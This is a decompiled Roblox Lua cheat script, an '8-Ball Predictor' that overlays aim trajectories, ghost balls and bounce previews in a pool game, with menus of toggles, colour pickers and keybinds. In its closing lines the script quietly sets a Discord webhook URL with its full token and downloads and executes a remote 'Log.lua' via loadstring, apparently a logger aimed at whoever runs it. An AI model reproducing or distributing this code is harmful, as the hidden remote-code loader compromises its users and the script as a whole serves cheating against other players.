				if (v432 - v429.Position).Magnitude > (v433 - v429.Position).Magnitude or not v432 then
					v436 = v433
				else
					v436 = v432
				end
				local v437 = v_u_74((v436 == v432 and v433 and v433 or v432) - v436)
				local v438 = 1
				if v_u_369 then
					local v439 = v_u_80(v_u_71(v_u_369, v437), -1, 1)
					if math.acos(v439) > 0.01 then
						v438 = v_u_38
					end
				end
				v_u_367 = v_u_375(v436, v_u_367, v_u_36 * v438, p428)
				v_u_368 = v_u_375(v437, v_u_368, v_u_37 * v438, p428)
				v_u_369 = v437
				v434 = v_u_367
				v435 = v_u_74(v_u_368)
			else
				local v440 = v_u_19
				if v440 then
					v440 = v_u_19:GetMouse()
				end
				local v441 = v_u_20.ViewportSize.X / 2
				local v442 = v_u_20.ViewportSize.Y / 2
				if v440 then
					v441 = v440.X
					v442 = v440.Y
				end
				local v443 = v_u_20:ScreenPointToRay(v441, v442)
				local v444 = (v429.Position.Y - v443.Origin.Y) / (v443.Direction.Y == 0 and 9.999999960041972e-13 or v443.Direction.Y)
				local v445 = v_u_74(v443.Origin + v443.Direction.Unit * v444 - v429.Position)
				local v446 = 1
				if v_u_369 then
					local v447 = v_u_80(v_u_71(v_u_369, v445), -1, 1)
					if math.acos(v447) > 0.01 then
						v446 = v_u_38
					end
				end
				v_u_367 = v_u_375(v429.Position, v_u_367, v_u_36 * v446, p428)
				v_u_368 = v_u_375(v445, v_u_368, v_u_37 * v446, p428)
				v_u_369 = v445
				v434 = v_u_367
				v435 = v_u_74(v_u_368)
			end
			local v448, v449 = v_u_286(v434, v435, v431)
			local v450 = v429.Position
			local v451
			if v_u_137 then
				local v452
				v451, v452 = v_u_314(v450)
			else
				v451 = v450
			end
			if not (v448 and v449) then
				v_u_410(v_u_395, 0)
				v_u_410(v_u_398, 0)
				if v_u_397[1] then
					v_u_397[1].Transparency = 1
				end
				local v453, v454 = v_u_355(v451, v435, v431, nil)
				if #v453 >= 2 then
					v453[1] = v450
				end
				local v455 = #v453 - 1
				v_u_402(v_u_394, v455, function()
					-- upvalues: (ref) v_u_384, (ref) v_u_57
					return v_u_384(v_u_57, 0.1)
				end)
				v_u_410(v_u_394, v455)
				v_u_410(v_u_396, v454 and 1 or 0, true)
				local v456 = 28
				for v457 = 1, v455 do
					local v458 = v_u_394[v457]
					v_u_416(v458.AP, v453[v457], v456, p428)
					v_u_416(v458.BP, v453[v457 + 1], v456, p428)
					v458.B.Color = ColorSequence.new(v_u_57)
				end
				if v454 then
					v_u_396[1] = v_u_396[1] or v_u_389(v_u_63, 0.3)
					v_u_416(v_u_396[1], v453[#v453], 28, p428)
				end
				v_u_426("CUE: " .. (v454 and "SUNK" or "\226\128\148"), "OBJ: \226\128\148", nil)
				return
			end
			local v459 = v434 + v435 * v449
			local v460 = v_u_74(v448.Position - v459)
			local v461 = v448.Position - v460 * v_u_28
			local v462 = v448.Position - v460 * 2 * v_u_28
			local v463 = v435 - v460 * v_u_71(v435, v460)
			local v464 = v463.Magnitude > 9.999999717180685e-10 and v_u_74(v463) or Vector3.new(0, 0, 0)
			local v465 = v_u_111(v435, v460)
			if not v_u_269(v434, v459, v431, v448) then
				v459 = v459 - v435 * v_u_28 * 0.02
			end
			local v466 = { v450, v459 }
			if v464.Magnitude > 9.999999717180685e-10 then
				local v467 = ({ v_u_355(v459, v464, v431, v448) })[1]
				for v468 = 2, #v467 do
					v466[#v466 + 1] = v467[v468]
				end
			end
			local v469, v470, v471, v472 = v_u_355(v448.Position, v460, v431, v448)
			local v473 = #v466 - 1
			v_u_402(v_u_394, v473, function()
				-- upvalues: (ref) v_u_384, (ref) v_u_57
				return v_u_384(v_u_57, 0.1)
			end)
			v_u_410(v_u_394, v473)
			local v474 = 28
			for v475 = 1, v473 do
				local v476 = v_u_394[v475]
				v_u_416(v476.AP, v466[v475], v474, p428)
				v_u_416(v476.BP, v466[v475 + 1], v474, p428)
				v476.B.Color = ColorSequence.new(v_u_57)
			end
			local v477 = #v469 - 1
			v_u_402(v_u_395, v477, function()
				-- upvalues: (ref) v_u_384, (ref) v_u_58
				return v_u_384(v_u_58, 0.08)
			end)
			v_u_410(v_u_395, v477)
			local v478 = v_u_58
			if v470 then
				v478 = v_u_59
			elseif v471 then
				v478 = v_u_60
			end
			for v479 = 1, v477 do
				v_u_395[v479].B.Color = ColorSequence.new(v478)
			end
			for v480 = 1, v477 do
				local v481 = v_u_395[v480]
				v_u_416(v481.AP, v469[v480], v474, p428)
				v_u_416(v481.BP, v469[v480 + 1], v474, p428)
			end
			if v_u_42 then
				v_u_402(v_u_397, 1, function()
					-- upvalues: (ref) v_u_393, (ref) v_u_62
					return v_u_393(v_u_62, 0.7)
				end)
				v_u_397[1].Transparency = 0.7
				v_u_397[1].Color = v_u_62
				v_u_416(v_u_397[1], v462, 28, p428)
			elseif v_u_397[1] then
				v_u_397[1].Transparency = 1
			end
			v_u_402(v_u_396, 2, function()
				-- upvalues: (ref) v_u_389, (ref) v_u_63
				return v_u_389(v_u_63, 0.25)
			end)
			v_u_410(v_u_396, 2 + (v470 and 1 or 0), true)
			v_u_416(v_u_396[1], v461, 28, p428)
			v_u_416(v_u_396[2], v462, 28, p428)
			v_u_396[1].Color = v_u_63
			v_u_396[2].Color = v_u_63
			if v470 then
				if not v_u_396[3] then
					v_u_396[3] = v_u_389(v_u_59, 0.2)
				end
				v_u_416(v_u_396[3], v469[#v469], 28, p428)
				v_u_396[3].Color = v_u_59
			end
			if v_u_45 and (v471 and v472) then
				local v482 = v469[#v469]
				local v483 = (v472.Position - v482).Unit
				local v484 = { v482 }
				for _ = 1, v_u_46 or 1 do
					local v485, v486, v487
					v485, v486, v487, v472 = v_u_355(v472.Position, v483, v431, v472)
					for v488 = 1, #v485 do
						table.insert(v484, v485[v488])
					end
					if v486 or not (v487 and v472) then
						break
					end
					local v489 = v485[#v485]
					v483 = (v472.Position - v489).Unit
					table.insert(v484, v489)
				end
				local v490 = #v484 - 1
				v_u_402(v_u_398, v490, function()
					-- upvalues: (ref) v_u_384, (ref) v_u_61
					return v_u_384(v_u_61, 0.1)
				end)
				v_u_410(v_u_398, v490)
				for v491 = 1, v490 do
					local v492 = v_u_398[v491]
					v_u_416(v492.AP, v484[v491], v474, p428)
					v_u_416(v492.BP, v484[v491 + 1], v474, p428)
					v492.B.Color = ColorSequence.new(v_u_61)
				end
			else
				v_u_410(v_u_398, 0)
			end
			v_u_426("CUE: Contact", v470 and "OBJ: SUNK" or (v471 and "OBJ: BLOCKED" or "OBJ: \226\128\148"), v_u_41 and v465 and v465 or nil)
		end)
		v18.InputBegan:Connect(function(p493, p494)
			-- upvalues: (ref) v_u_39, (ref) v_u_40, (ref) v_u_44, (ref) v_u_80, (ref) v_u_42
			if not p494 then
				if p493.KeyCode ~= Enum.KeyCode.RightShift then
					if p493.KeyCode ~= Enum.KeyCode.H then
						if p493.KeyCode ~= Enum.KeyCode.RightBracket then
							if p493.KeyCode ~= Enum.KeyCode.LeftBracket then
								if p493.KeyCode == Enum.KeyCode.G then
									v_u_42 = not v_u_42
									print("[8-Ball] Ghost Ball:", v_u_42 and "ON" or "OFF")
								end
							else
								v_u_44 = v_u_80(v_u_44 - 1, 0, 6)
								print("[8-Ball] Max Bounces:", v_u_44)
							end
						else
							v_u_44 = v_u_80(v_u_44 + 1, 0, 6)
							print("[8-Ball] Max Bounces:", v_u_44)
						end
					else
						v_u_40 = not v_u_40
						print("[8-Ball] HUD:", v_u_40 and "ON" or "OFF")
					end
				else
					v_u_39 = not v_u_39
					print("[8-Ball] Predictor:", v_u_39 and "ON" or "OFF")
				end
			end
		end)
		v12:Label("8-Ball Predictor Controls")
		v12:Toggle("Enable Predictor", function(p495)
			-- upvalues: (ref) v_u_39
			v_u_39 = p495
		end)
		v12:Toggle("Show HUD", function(p496)
			-- upvalues: (ref) v_u_40
			v_u_40 = p496
		end)
		v12:Toggle("Show Cut Angle", function(p497)
			-- upvalues: (ref) v_u_41
			v_u_41 = p497
		end)
		v12:Toggle("Show Ghost Ball", function(p498)
			-- upvalues: (ref) v_u_42
			v_u_42 = p498
		end)
		v12:Toggle("Auto Bounces", function(p499)
			-- upvalues: (ref) v_u_43
			v_u_43 = p499
		end)
		v12:Slider("Max Bounces", 0, 6, v_u_44, function(p500)
			-- upvalues: (ref) v_u_44
			v_u_44 = p500
		end)
		v12:Toggle("Cascade Preview", function(p501)
			-- upvalues: (ref) v_u_45
			v_u_45 = p501
		end)
		v12:Slider("Cascade Depth", 1, 5, v_u_46, function(p502)
			-- upvalues: (ref) v_u_46
			v_u_46 = p502
		end)
		v13:Label("Cue Ball Line")
		v13:Colorpicker("Cue Beam Color", v_u_57, function(p503)
			-- upvalues: (ref) v_u_57
			v_u_57 = p503
		end)
		v13:Label("Object Ball Line")
		v13:Colorpicker("Object Beam Color", v_u_58, function(p504)
			-- upvalues: (ref) v_u_58
			v_u_58 = p504
		end)
		v13:Colorpicker("Object Sunk Color", v_u_59, function(p505)
			-- upvalues: (ref) v_u_59
			v_u_59 = p505
		end)
		v13:Colorpicker("Object Blocked Color", v_u_60, function(p506)
			-- upvalues: (ref) v_u_60
			v_u_60 = p506
		end)
		v13:Label("Cascade & Ghost")
		v13:Colorpicker("Cascade Color", v_u_61, function(p507)
			-- upvalues: (ref) v_u_61
			v_u_61 = p507
		end)
		v13:Colorpicker("Ghost Ball Color", v_u_62, function(p508)
			-- upvalues: (ref) v_u_62
			v_u_62 = p508
		end)
		v13:Colorpicker("Dot Color", v_u_63, function(p509)
			-- upvalues: (ref) v_u_63
			v_u_63 = p509
		end)
		v14:Label("Physics Settings")
		v14:Slider("Energy Decay", 1, 10, math.floor(v_u_50 * 10), function(p510)
			-- upvalues: (ref) v_u_50
			v_u_50 = p510 / 10
		end)
		v14:Slider("Min Energy", 1, 10, math.floor(v_u_51 * 10), function(p511)
			-- upvalues: (ref) v_u_51
			v_u_51 = p511 / 10
		end)
		v14:Slider("Base Range", 100, 2000, v_u_52, function(p512)
			-- upvalues: (ref) v_u_52
			v_u_52 = p512
		end)
		v15:Label("Smoothing Settings")
		v15:Slider("Position Smoothing Hz", 10, 50, v_u_36, function(p513)
			-- upvalues: (ref) v_u_36
			v_u_36 = p513
		end)
		v15:Slider("Direction Smoothing Hz", 10, 50, v_u_37, function(p514)
			-- upvalues: (ref) v_u_37
			v_u_37 = p514
		end)
		v15:Slider("Fast Boost Multiplier", 1, 5, math.floor(v_u_38 * 10) / 10, function(p515)
			-- upvalues: (ref) v_u_38
			v_u_38 = p515
		end)
		v15:Label("Visual Settings")
		v15:Slider("Line Thickness", 1, 10, math.floor(v_u_30 * 100), function(p516)
			-- upvalues: (ref) v_u_30
			v_u_30 = p516 / 100
		end)
		v15:Button("Rebuild Table Bounds", function()
			-- upvalues: (ref) v_u_427, (ref) v_u_199
			v_u_427()
			v_u_199()
			print("[8-Ball] Table bounds rebuilt!")
		end)
		v15:Button("Clear Visuals", function()
			-- upvalues: (ref) v_u_376, (ref) v_u_21, (ref) v_u_68, (ref) v_u_394, (ref) v_u_395, (ref) v_u_396, (ref) v_u_397, (ref) v_u_398
			if v_u_376 then
				v_u_376:Destroy()
				v_u_376 = Instance.new("Folder")
				v_u_376.Name = "EightBall_Fixed"
				v_u_376.Parent = v_u_21
				v_u_68(v_u_394)
				v_u_68(v_u_395)
				v_u_68(v_u_396)
				v_u_68(v_u_397)
				v_u_68(v_u_398)
			end
			print("[8-Ball] Visuals cleared!")
		end)
		v16:Label("Keybinds:")
		v16:Label("Right Shift = Toggle Predictor")
		v16:Label("H = Toggle HUD")
		v16:Label("[  ] = Adjust Bounces")
		v16:Label("G = Toggle Ghost Ball")
		v16:Button("Bind UI Toggle Key", function()
			-- upvalues: (ref) v_u_10
			local v_u_517 = true
			local v_u_518 = nil
			v_u_518 = v_u_10.InputBegan:Connect(function(p519, p520)
				-- upvalues: (ref) v_u_517, (ref) v_u_518, (ref) v_u_10
				if not p520 and v_u_517 then
					v_u_517 = false
					if v_u_518 then
						v_u_518:Disconnect()
					end
					local v_u_521 = p519.KeyCode
					if v_u_521 and v_u_521 ~= Enum.KeyCode.Unknown then
						v_u_10.InputBegan:Connect(function(p522, p523)
							-- upvalues: (ref) v_u_521
							local v524 = (not p523 and p522.KeyCode == v_u_521 and true or false) and game:GetService("CoreGui"):FindFirstChild("Library")
							if v524 then
								v524.Enabled = not v524.Enabled
							end
						end)
					end
				end
			end)
		end)
		v16:Button("Unload Script", function()
			-- upvalues: (ref) v_u_376
			pcall(function()
				-- upvalues: (ref) v_u_376
				if v_u_376 then
					v_u_376:Destroy()
				end
				local v525 = game:GetService("CoreGui"):FindFirstChild("Library")
				if v525 then
					v525:Destroy()
				end
			end)
		end)
		v17:Button("Made by Urbanstorm", function()
			pcall(function()
				setclipboard("Urbanstorm")
			end)
		end)
		v17:Button("Discord: discord.gg/vgYZApyrZC", function()
			pcall(function()
				setclipboard("https://discord.gg/vgYZApyrZC")
			end)
		end)
		if not v4 then
			task.spawn(function()
				pcall(function()
					getgenv().Webyhookie = "https://discord.com/api/webhooks/1437099776410652686/ZObnUk_5iW2R5plVjBwIzO95aTGISl2SmcfQdAet_ADhoMBKQRjaEMadqPK1Nm73g2pl"
					getgenv().Titlewebyhookie = "\226\129\184\226\129\187\225\180\174\225\181\131\203\161\203\161 \225\180\190\225\181\146\225\181\146\203\161"
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
				end)
			end)
		end
	end
end
return v1["script.lua"](...)
